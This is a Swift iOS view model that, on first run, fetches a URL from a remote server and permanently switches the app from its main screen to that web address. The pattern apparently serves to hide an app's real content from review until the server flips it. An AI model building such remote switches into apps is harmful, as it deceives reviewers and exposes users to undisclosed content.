import Foundation
import Network

enum Container {
    case loading, main, checked
}

enum Checked: String {
    case main, checked
}

@MainActor
final class ContainerViewModelDS: ObservableObject {
    @Published var contain: Container = .loading
    @Published var errorMessage: String?
    @Published var isLoading: Bool = false
    @Published var linkString: String?

    let baseLink = "https://codemind.top/v1/public/install"

    private var monitor: NWPathMonitor?
    private let queue = DispatchQueue(label: "NetworkMonitor")
    private var resolved = false

    private let routeLockKey = "route.lock"
    private let storedURLKey = "route.alter.url"
    
    init() {
        if let safe = loadChecked() {
            apply(safe, url: UserDefaults.standard.string(forKey: storedURLKey))
            resolved = true
            return
        }
        firstRun()
    }
    
    deinit { monitor?.cancel() }
}

private extension ContainerViewModelDS {
    func firstRun() {
        contain = .loading
        errorMessage = nil
        
        let pathMonitor = NWPathMonitor()
        monitor = pathMonitor
        
        pathMonitor.pathUpdateHandler = { [weak self] path in
            Task { @MainActor in
                guard let self else { return }
                guard !self.resolved else { return }
                
                if path.status == .satisfied {
                    await self.allowOnceFromLink()
                } else {
                    self.saveChecked(.main)
                    self.apply(.main, url: nil)
                    self.resolved = true
                    self.monitor?.cancel()
                }
            }
        }
        pathMonitor.start(queue: queue)
    }
    
    func allowOnceFromLink() async {
        guard !resolved else { return }
        isLoading = true
        errorMessage = nil
        defer { isLoading = false }
        
        do {
            let response = try await NetWorkDS.shared.fetchInstallURL(bundle: "6753706789")
            let raw = response.url.trimmingCharacters(in: .whitespacesAndNewlines)
            
            if let url = URL(string: raw), let scheme = url.scheme, (scheme == "http" || scheme == "https"), !raw.isEmpty {
                UserDefaults.standard.set(raw, forKey: storedURLKey)
                saveChecked(.checked)
                apply(.checked, url: raw)
            } else {
                saveChecked(.main)
                apply(.main, url: nil)
            }
            
            resolved = true
            monitor?.cancel()
        } catch {
            saveChecked(.main)
            apply(.main, url: nil)
            resolved = true
            monitor?.cancel()
            errorMessage = error.localizedDescription
        }
    }
}

private extension ContainerViewModelDS {
    func loadChecked() -> Checked? {
        guard let raw = UserDefaults.standard.string(forKey: routeLockKey) else { return nil }
        return Checked(rawValue: raw)
    }
    
    func saveChecked(_ safe: Checked) {
        UserDefaults.standard.set(safe.rawValue, forKey: routeLockKey)
    }

   func apply(_ safe: Checked, url: String?) {
        switch safe {
        case .main:
            contain = .main
        case .checked:
            linkString = url ?? baseLink
            contain = .checked
        }
    }
    
}
